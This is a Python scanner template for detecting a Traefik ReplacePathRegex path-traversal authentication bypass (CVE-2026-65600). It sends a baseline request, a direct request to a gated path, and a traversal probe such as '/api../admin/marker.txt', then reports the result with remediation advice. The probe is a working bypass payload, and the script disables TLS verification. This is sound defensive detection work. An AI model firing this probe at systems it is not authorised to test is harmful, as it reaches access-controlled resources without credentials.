#!/usr/bin/env python3
# @id: traefik-replacepathregex-auth-bypass
# @name: Traefik ReplacePathRegex Path-Traversal Auth Bypass (CVE-2026-65600)
# @author: BugB Security Team
# @severity: high
# @description: Detects a Traefik ReplacePathRegex middleware that forwards a rewritten path without re-normalizing it, so a request whose path carries a dot segment (e.g. /api../admin) is routed by an unauthenticated prefix router, rewritten to /../admin, and resolved by a normalizing backend to a route a separate authenticated router was meant to gate. Confirms behaviourally: a resource that is gated when requested directly becomes reachable without credentials through the rewrite. CVE-2026-65600, GHSA-cxjq-mrr5-89rv.
# @tags: traefik, auth-bypass, path-traversal, replacepathregex, reverse-proxy, cve-2026-65600, cwe-22, broken-access-control
# @cwe: CWE-22
# @cvss: 8.1
# @target_kinds: http
# @oracles: property
# @references: https://github.com/advisories/GHSA-cxjq-mrr5-89rv, https://nvd.nist.gov/vuln/detail/CVE-2026-65600, https://doc.traefik.io/traefik/middlewares/http/replacepathregex/, https://cwe.mitre.org/data/definitions/22.html
# @confidence: 90
# @version: 1.0.0
#
# WHAT THIS CHECKS, AND WHY IT IS BEHAVIOURAL (not a version banner)
#
# Traefik does not advertise its version on the data path, and the flaw is a
# property of one middleware's runtime path handling, not of a build string. The
# fix (3.6.23 / 3.7.7 / 2.11.52) "rejects any request whose replaced path does not
# match its normalized form" -- it is a behaviour change, so the only sound test is
# to exercise the behaviour: does a dot-segment survive the rewrite and reach a
# gated route?
#
# The confirmation bar is a *flip*, observed on this target, not a guess:
#
#   1. baseline  GET <api_prefix>            must be 200  -> the rewrite router and
#                                            a normalizing backend are actually here
#   2. gate       GET <protected_path>       must be 401/403 -> the resource really
#                                            is access-controlled when asked directly
#   3. probe      GET <api_prefix>..<protected_path>   (a single benign GET; the ".."
#                                            is a literal path segment, no payload)
#        -> 200 reaching the SAME gated resource  == CONFIRMED (auth bypassed)
#        -> 400 / 404 / 401 / 403 / 3xx           == REFUTED   (gate held)
#
# Only all three together confirm. A gate that answers 200 to a direct request was
# never gated (recorded as an observation, never a confirmation); a probe that
# answers 200 with a body unlike the authenticated resource is a near-miss, not a
# bypass. The probe is read-only and retrieves nothing a credentialed client could
# not already read; it proves the access decision was skipped, it does not weaponise
# the access.
#
# PARAMETERS (via --context JSON; defaults match the repo's docker lab)
#   api_prefix       unauthenticated prefix router path         (default "/api")
#   protected_path   a path gated by a separate auth router     (default "/admin/marker.txt")
#   protected_marker substring unique to the protected resource (optional; raises
#                    confidence and suppresses false 200s when known)

import os
import sys
import json
import http.client
from datetime import datetime, timezone
from urllib.parse import urlsplit

TEMPLATE_ID = "traefik-replacepathregex-auth-bypass"
TEMPLATE_NAME = "Traefik ReplacePathRegex Path-Traversal Auth Bypass (CVE-2026-65600)"
CWE = "CWE-22"
SEVERITY = "high"
CONFIDENCE = 90
CVSS = 8.1
REFERENCES = [
    "https://github.com/advisories/GHSA-cxjq-mrr5-89rv",
    "https://nvd.nist.gov/vuln/detail/CVE-2026-65600",
    "https://doc.traefik.io/traefik/middlewares/http/replacepathregex/",
    "https://cwe.mitre.org/data/definitions/22.html",
]
GATED_CODES = {401, 403}


def get_context():
    raw = os.environ.get("CERT_X_GEN_CONTEXT", "{}")
    try:
        ctx = json.loads(raw)
        return ctx if isinstance(ctx, dict) else {}
    except Exception:
        return {}


def get_target():
    # A cli:// scope leaves the prefix on HOST; this template is http-only, so
    # strip any scheme and treat what remains as host[:port].
    host = os.environ.get("CERT_X_GEN_TARGET_HOST")
    port = os.environ.get("CERT_X_GEN_TARGET_PORT")
    scheme = os.environ.get("CERT_X_GEN_TARGET_PROTOCOL", "http")
    if host and "://" in host:
        parts = urlsplit(host)
        scheme = parts.scheme or scheme
        host = parts.hostname or host
        port = port or (str(parts.port) if parts.port else None)
    return host, int(port) if port else (443 if scheme == "https" else 80), scheme


def raw_get(host, port, scheme, selector, timeout=10):
    """
    Send GET with the request-target used verbatim -- http.client does not
    rewrite the path, so a dot segment reaches the wire exactly as written.
    Redirects are NOT followed (a 3xx is itself a refutation signal).
    Returns (status, body_text) or (None, None) on transport failure.
    """
    conn = None
    try:
        if scheme == "https":
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        conn.putrequest("GET", selector, skip_host=False, skip_accept_encoding=True)
        conn.putheader("User-Agent", "CXG-Traefik-ReplacePathRegex/1.0")
        conn.putheader("Accept", "*/*")
        conn.endheaders()
        resp = conn.getresponse()
        body = resp.read(65536).decode("utf-8", errors="ignore")
        return resp.status, body
    except Exception:
        return None, None
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass


def emit(status, detail, findings=None):
    meta = {
        "id": TEMPLATE_ID,
        "name": TEMPLATE_NAME,
        "severity": SEVERITY,
        "confidence": CONFIDENCE,
        "cwe": CWE,
        "tags": ["traefik", "auth-bypass", "path-traversal", "cve-2026-65600", "cwe-22"],
        "status": status,
        "detail": detail,
    }
    print(json.dumps({"findings": findings or [], "metadata": meta}, indent=2))


def build_finding(target, evidence):
    return {
        "template_id": TEMPLATE_ID,
        "template_name": TEMPLATE_NAME,
        "target": target,
        "severity": SEVERITY,
        "confidence": CONFIDENCE,
        "title": "Traefik ReplacePathRegex rewrite reaches a gated route without credentials",
        "description": (
            "A request carrying a dot segment through the unauthenticated prefix "
            "router was rewritten by ReplacePathRegex and resolved by the backend to "
            "a resource that a separate authenticated router gates. The same resource "
            "returns 401/403 when requested directly but 200 through the rewrite, so "
            "the access-control decision is bypassed. This is CVE-2026-65600: the "
            "middleware forwards the replaced path without re-normalizing it. Fixed in "
            "Traefik 2.11.52 / 3.6.23 / 3.7.7."
        ),
        "evidence": evidence,
        "cwe": CWE,
        "cvss_score": CVSS,
        "remediation": (
            "Upgrade Traefik to 2.11.52, 3.6.23, 3.7.7 or later, which rejects a "
            "request whose replaced path does not match its normalized form. As "
            "defence in depth, do not rely on path-prefix routing alone for "
            "authorization, and prefer a regex anchored with a slash separator "
            "(^/api/(.*)) which is not affected."
        ),
        "references": REFERENCES,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


def scan(host, port, scheme):
    ctx = get_context()
    api_prefix = ctx.get("api_prefix", "/api")
    protected_path = ctx.get("protected_path", "/admin/marker.txt")
    protected_marker = ctx.get("protected_marker")  # optional
    if not api_prefix.startswith("/"):
        api_prefix = "/" + api_prefix
    if not protected_path.startswith("/"):
        protected_path = "/" + protected_path
    # /api + ".." + /admin/marker.txt -> /api../admin/marker.txt : ".." is a literal
    # path segment, not a /../ sequence, so no HTTP client collapses it in transit.
    probe_path = api_prefix + ".." + protected_path

    target = "%s://%s:%d" % (scheme, host, port)
    surface = "api_prefix=%s protected_path=%s probe=%s" % (api_prefix, protected_path, probe_path)
    observations = []

    # 1. Baseline: the rewrite router + a normalizing backend must actually be here.
    base_status, base_body = raw_get(host, port, scheme, api_prefix)
    if base_status is None:
        return "skipped", "no-http-response(%s%s)" % (target, api_prefix), []
    if base_status != 200:
        return ("skipped",
                "baseline-%s-not-200(status=%s) -- no ReplacePathRegex api surface here; %s"
                % (api_prefix, base_status, surface), [])

    # 2. Gate: the protected resource must be access-controlled when asked directly.
    gate_status, _ = raw_get(host, port, scheme, protected_path)
    if gate_status is None:
        return "skipped", "gate-request-failed(%s%s)" % (target, protected_path), []
    if gate_status not in GATED_CODES:
        observations.append("direct %s returned %s (not gated); nothing to bypass"
                            % (protected_path, gate_status))
        return ("refuted",
                "protected-path-not-gated(status=%s) -- %s is not access-controlled, "
                "so a 200 through the rewrite would not prove a bypass; %s"
                % (gate_status, protected_path, surface), [])

    # 3. Probe: the single benign traversal GET.
    probe_status, probe_body = raw_get(host, port, scheme, probe_path)
    if probe_status is None:
        return "skipped", "probe-request-failed(%s%s)" % (target, probe_path), []

    if probe_status != 200:
        # The gate held: 400 (fixed Traefik rejects), 404, or the gate answered again.
        return ("refuted",
                "rewrite-did-not-bypass-gate(direct=%s probe=%s) -- gate held; %s"
                % (gate_status, probe_status, surface), [])

    # probe == 200: the rewrite reached a resource the direct path gated.
    marker_ok = True
    if protected_marker is not None:
        marker_ok = protected_marker in (probe_body or "")
        if not marker_ok:
            observations.append(
                "probe returned 200 but body did not contain the expected protected "
                "marker -- could be a generic page rather than the gated resource")
            return ("refuted",
                    "probe-200-without-protected-marker(direct=%s) -- near-miss, not a "
                    "confirmed bypass; %s" % (gate_status, surface), [])

    evidence = {
        "request": "GET %s  (dot-segment survives ReplacePathRegex rewrite)" % probe_path,
        "data": {
            "protocol": scheme,
            "port": port,
            "api_prefix": api_prefix,
            "protected_path": protected_path,
            "probe_path": probe_path,
            "baseline_status": base_status,
            "direct_gate_status": gate_status,
            "probe_status": probe_status,
            "protected_marker_observed": (protected_marker in (probe_body or ""))
            if protected_marker is not None else None,
            "probe_body_preview": (probe_body or "")[:300],
        },
        "observations": observations,
    }
    detail = ("auth-bypass(direct %s=%s, rewrite %s=200) marker=%s; %s"
              % (protected_path, gate_status, probe_path,
                 "matched" if protected_marker is not None else "not-checked", surface))
    return "confirmed", detail, [build_finding(target, evidence)]


def main():
    host, port, scheme = get_target()
    if not host:
        emit("skipped", "CERT_X_GEN_TARGET_HOST not set")
        return
    # Allow argv override for standalone runs: host [port] [scheme]
    if os.environ.get("CERT_X_GEN_MODE") != "engine" and len(sys.argv) >= 2:
        host = sys.argv[1]
        port = int(sys.argv[2]) if len(sys.argv) > 2 else port
        scheme = sys.argv[3] if len(sys.argv) > 3 else scheme
    status, detail, findings = scan(host, port, scheme)
    emit(status, detail, findings)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        emit("errored", "unexpected: %s" % e)
        sys.exit(0)
